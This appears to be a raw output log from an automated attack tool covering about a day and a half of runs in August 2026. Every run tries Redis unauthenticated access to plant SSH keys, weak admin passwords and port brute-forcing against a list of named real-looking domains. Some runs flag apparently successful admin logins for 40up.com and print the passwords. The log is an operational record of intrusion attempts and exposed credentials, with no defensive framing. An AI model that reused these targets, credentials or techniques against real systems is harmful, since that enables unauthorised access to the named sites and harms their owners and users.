  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 07:56:11 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 08:05:00 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 08:07:37 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 08:54:39 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 08:56:58 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 09:04:12 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 09:07:14 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 09:52:34 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 09:54:35 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 09:59:26 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 10:02:08 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 10:54:43 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 10:56:29 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 11:02:30 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 11:05:08 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 11:52:56 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 11:55:04 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 12:00:53 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 12:04:05 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 12:52:51 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 12:54:35 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 13:00:41 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 13:04:09 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 13:52:47 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 13:54:23 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 14:00:57 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 14:04:06 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 14:52:48 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 14:55:15 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 15:02:17 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 15:05:30 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 15:51:21 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 15:53:22 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 16:02:57 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Sat Aug  8 16:04:59 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 16:51:29 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sat Aug  8 16:51:31 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 17:48:18 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sat Aug  8 17:48:19 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 18:38:20 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sat Aug  8 18:38:21 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 18:47:49 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sat Aug  8 18:47:51 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 19:37:59 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sat Aug  8 19:38:00 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 19:44:13 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sat Aug  8 19:44:14 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 20:37:30 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sat Aug  8 20:37:31 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 20:46:33 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sat Aug  8 20:46:34 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 21:36:21 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sat Aug  8 21:36:22 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 21:46:26 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sat Aug  8 21:46:27 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 22:36:42 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sat Aug  8 22:36:44 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 22:46:30 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sat Aug  8 22:46:32 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 23:36:45 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sat Aug  8 23:36:47 UTC 2026 ===
=== AUTO ATTACK Sat Aug  8 23:45:59 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sat Aug  8 23:46:00 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 00:35:09 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sun Aug  9 00:35:10 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 00:47:04 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sun Aug  9 00:47:05 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 01:36:20 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sun Aug  9 01:36:22 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 01:47:19 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sun Aug  9 01:47:21 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 02:36:27 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sun Aug  9 02:36:28 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 02:47:20 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sun Aug  9 02:47:21 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 03:37:11 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sun Aug  9 03:37:13 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 03:47:00 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sun Aug  9 03:47:01 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 04:35:30 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sun Aug  9 04:35:31 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 04:43:04 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sun Aug  9 04:43:05 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 05:37:29 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sun Aug  9 05:37:30 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 05:47:11 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sun Aug  9 05:47:12 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 05:48:05 UTC 2026 ===
[1] Redis unauth -> ssh key
=== AUTO ATTACK Sun Aug  9 05:48:05 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[2] admin weak pass
[3] port brute
[3] port brute
=== AUTO ATTACK END Sun Aug  9 05:48:07 UTC 2026 ===
=== AUTO ATTACK END Sun Aug  9 05:48:07 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 06:38:07 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sun Aug  9 06:38:08 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 06:48:04 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
=== AUTO ATTACK END Sun Aug  9 06:48:05 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 07:46:17 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 07:48:14 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 08:35:31 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 08:37:31 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 08:41:43 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 08:43:24 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 09:38:03 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 09:39:42 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 09:47:34 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 09:49:13 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 10:36:59 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 10:38:40 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 10:44:28 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 10:46:08 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 10:47:49 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 10:49:14 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 11:47:54 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 11:49:24 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 12:37:06 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 12:39:20 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 12:47:42 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 12:49:57 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 13:35:23 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 13:37:16 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 13:37:48 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 13:39:36 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 14:38:23 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 14:40:25 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 14:44:42 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 14:46:25 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 15:40:56 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 15:42:42 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 15:48:04 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 15:49:59 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 16:41:33 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 16:43:40 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 16:48:53 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 16:50:33 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 17:41:11 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 17:43:00 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 17:50:02 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
=== AUTO ATTACK Sun Aug  9 17:51:08 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 17:51:36 UTC 2026 ===
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 17:52:40 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 18:51:13 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 18:52:43 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 19:39:53 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 19:41:38 UTC 2026 ===
